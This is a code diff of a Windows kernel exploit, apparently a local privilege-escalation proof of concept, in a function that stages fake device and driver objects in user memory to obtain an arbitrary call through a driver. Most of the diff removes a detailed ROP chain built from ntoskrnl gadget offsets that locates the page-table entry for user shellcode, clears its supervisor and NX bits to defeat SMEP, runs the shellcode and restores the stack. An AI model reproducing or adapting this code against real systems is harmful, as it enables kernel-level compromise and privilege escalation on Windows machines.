@@ -389,13 +389,11 @@ BOOL arbitraryCallDriver(PVOID outputBuffer, SIZE_T outSize) {
 		PAGE_EXECUTE_READWRITE);
 
 	char* object = (char*)VirtualAlloc(
-		(LPVOID)(0x0000001afeffe000),
-		0x12000,
+		NULL,
+		SIZE_BUF,
 		MEM_COMMIT | MEM_RESERVE,
 		PAGE_EXECUTE_READWRITE);
 	printf("[+] object = 0x%p\n", object);
-	object = (char*)(0x1aff000000 - 0x30);
-	printf("[+] second object = 0x%p\n", object);
 
 	PDEVICE_OBJECT ptr = (PDEVICE_OBJECT)(object + 0x30);
 
@@ -408,7 +406,7 @@ BOOL arbitraryCallDriver(PVOID outputBuffer, SIZE_T outSize) {
 		MEM_COMMIT | MEM_RESERVE,
 		PAGE_EXECUTE_READWRITE);
 
-	printf("[+] object2 = 0x%p\n", object2); //0x0000001af5ff0000
+	printf("[+] object2 = 0x%p\n", object2);
 	memset(object2, 0x43, 0x30);
 
 	char* driverObject = (char*)VirtualAlloc(
@@ -428,131 +426,10 @@ BOOL arbitraryCallDriver(PVOID outputBuffer, SIZE_T outSize) {
 
 	
 	memset(ptr->AttachedDevice, 0x42, SIZE_BUF-0x40);
-	//*((DWORD*)ptr->AttachedDevice) = 0xf6000000;
 
 	printf("[+] ptr->AttachedDevice = 0x%p\n", ptr->AttachedDevice);
 	
-	PULONGLONG fake_stack = (PULONGLONG)VirtualAlloc((LPVOID)0x00000000feffe000, 0x12000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 	
-	if (fake_stack == 0) {
-		printf("[-] VirtualAlloc failed with error: %d\n", GetLastError());
-		exit(0);
-	}
-	printf("[*] fake_stack = 0x%p\n", fake_stack);
-
-	PULONGLONG ropStack = (PULONGLONG)fake_stack + 0x2000;
-
-	if (!VirtualLock((char*)ropStack - 0x3000, 0x10000)) {
-		printf("[-] virtualLock failed with error: %d\n", GetLastError());
-		exit(0);
-	}
-
-	memset(fake_stack, 0x41, 0x12000);
-	
-	printf("[+] VirtualLock returned successfully\n");
-
-	printf("[*] ropStack = 0x%p\n", ropStack);
-	DWORD index = 0;
-
-
-	char* scbase = (char*)VirtualAlloc((LPVOID)0x1a1a1a000000, 0x5000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-	if (!VirtualLock(scbase, 0x5000)) {
-		printf("[-] virtualLock failed with error: %d\n", GetLastError());
-		exit(0);
-	}
-	memset(scbase, 0x42, 0x5000);
-	char* sc = scbase + 0x3500;
-	memcpy(sc, shellcode, sizeof(shellcode));
-
-
-	unsigned int pml4shellcode_index = ExtractPml4Index(sc);
-	printf("[*] sc = 0x%p\n", sc);
-	printf("[*] pml4shellcode_index 0x%p\n", pml4shellcode_index);
-
-	//<get base from nt!MiGetPteAddress+0x13>
-	ropStack[index] = g_ntbase + 0x203beb; index++; // pop rax; ret;
-	ropStack[index] = g_ntbase + 0x2abaf7; index++; // address of nt!MiGetPteAddress+0x13
-	ropStack[index] = g_ntbase + 0x235aa6; index++; // mov rax, qword ptr [rax]; ret;
-	//<get base from nt!MiGetPteAddress+0x13>
-
-	//<get pml4Index>
-	ropStack[index] = g_ntbase + 0x34bb9c; index++; // pop rdx; ret;
-	ropStack[index] = 0x1ff; index++; // 0x1ff
-	ropStack[index] = g_ntbase + 0x752664; index++;// shr rax, 0xc; ret;
-	ropStack[index] = g_ntbase + 0x752664; index++;// shr rax, 0xc; ret;
-	ropStack[index] = g_ntbase + 0x752664; index++;// shr rax, 0xc; ret;
-	ropStack[index] = g_ntbase + 0x38738b; index++;//shr rax, 3; ret;
-	ropStack[index] = g_ntbase + 0x358532; index++;// and rax, rdx; ret;
-	//<get pml4index> now pml4index in rax
-
-	//<move pml4index in rcx>
-	ropStack[index] = g_ntbase + 0x34bb9c; index++;// pop rdx; ret;
-	ropStack[index] = (ULONGLONG)&ropStack[index + 3]; index++;
-	ropStack[index] = g_ntbase + 0x35dbc9; index++; // mov qword ptr [rdx], rax; ret;
-	ropStack[index] = g_ntbase + 0x2053e5; index++; // pop rcx; ret;
-	ropStack[index] = 0x4141414141414141; index++;//dummy
-	//<mov pml4index in rcx>
-
-	//<get pml4 address>
-	ropStack[index] = g_ntbase + 0x203beb; index++;// pop rax; ret;
-	ropStack[index] = 0xffff; index++;
-	//first round
-	ropStack[index] = g_ntbase + 0x38aa1f; index++;// shl rax, 3; ret;
-	ropStack[index] = g_ntbase + 0x38aa1f; index++;// shl rax, 3; ret;
-	ropStack[index] = g_ntbase + 0x38aa1f; index++;// shl rax, 3; ret;
-	ropStack[index] = g_ntbase + 0x24d001; index++;// or rax, rcx; ret;
-	//second round
-	ropStack[index] = g_ntbase + 0x38aa1f; index++;// shl rax, 3; ret;
-	ropStack[index] = g_ntbase + 0x38aa1f; index++;// shl rax, 3; ret;
-	ropStack[index] = g_ntbase + 0x38aa1f; index++;// shl rax, 3; ret;
-	ropStack[index] = g_ntbase + 0x24d001; index++;// or rax, rcx; ret;
-	//third round
-	ropStack[index] = g_ntbase + 0x38aa1f; index++;// shl rax, 3; ret;
-	ropStack[index] = g_ntbase + 0x38aa1f; index++;// shl rax, 3; ret;
-	ropStack[index] = g_ntbase + 0x38aa1f; index++;// shl rax, 3; ret;
-	ropStack[index] = g_ntbase + 0x24d001; index++;// or rax, rcx; ret;
-	//fourth round
-	ropStack[index] = g_ntbase + 0x38aa1f; index++;// shl rax, 3; ret;
-	ropStack[index] = g_ntbase + 0x38aa1f; index++;// shl rax, 3; ret;
-	ropStack[index] = g_ntbase + 0x38aa1f; index++;// shl rax, 3; ret;
-	ropStack[index] = g_ntbase + 0x24d001; index++;// or rax, rcx; ret;
-	//fifth round
-	ropStack[index] = g_ntbase + 0x322d1b; index++;// shl rax, 0xc; ret;
-	ropStack[index] = g_ntbase + 0x2053e5; index++; // pop rcx; ret;
-	ropStack[index] = (DWORD64)pml4shellcode_index * 8; index++;
-	ropStack[index] = g_ntbase + 0x24d001; index++;// or rax, rcx; ret;
-	//<get pml4 address> pml4 address in rax
-	
-	//<clean owner bit O=S position 2>
-	ropStack[index] = g_ntbase + 0x34bb9c; index++;// pop rdx; ret;
-	ropStack[index] = 0x2; index++;
-	ropStack[index] = g_ntbase + 0x354294; index++;// btr qword ptr [rax], rdx; ret;
-	//<clean owner bit O=S position 2>
-
-	//<clean NX bit position 63>
-	ropStack[index] = g_ntbase + 0x34bb9c; index++;// pop rdx; ret;
-	ropStack[index] = 63; index++;
-	ropStack[index] = g_ntbase + 0x354294; index++;// btr qword ptr [rax], rdx; ret;
-	//<clean NX bit position 63>
-
-	ropStack[index] = g_ntbase + 0x370050; index++; // wbinvd; ret;
-
-	//<shellcode>
-	ropStack[index] = (ULONGLONG)sc; index++;
-
-	//<cleanup>
-	ropStack[index] = g_ntbase + 0x35dbc9; index++; // mov qword ptr [rdx], rax; ret;
-	ropStack[index] = g_ntbase + 0x3d4cba; index++; // xor rax, rax; ret;
-	ropStack[index] = g_ntbase + 0x370050; index++; // wbinvd; ret;
-	ropStack[index] = g_ntbase + 0x20505a; index++; // pop rsp; ret;
-	ropStack[index] = 0x4141414141414141; index++; // filled with rsp value
-	//<cleanup>
-
-#ifdef _DEBUG
-	for (int i = 0; i < index; i++) {
-		printf("ropStack[%d] %p : 0x%p\n", i, &ropStack[i], ropStack[i]);
-	}
-#endif
 	ptr->AttachedDevice->DriverObject = (_DRIVER_OBJECT*)ptrDriver;
 	ptr->AttachedDevice->AttachedDevice = 0;
 	char* ptr2 = inputBuffer;
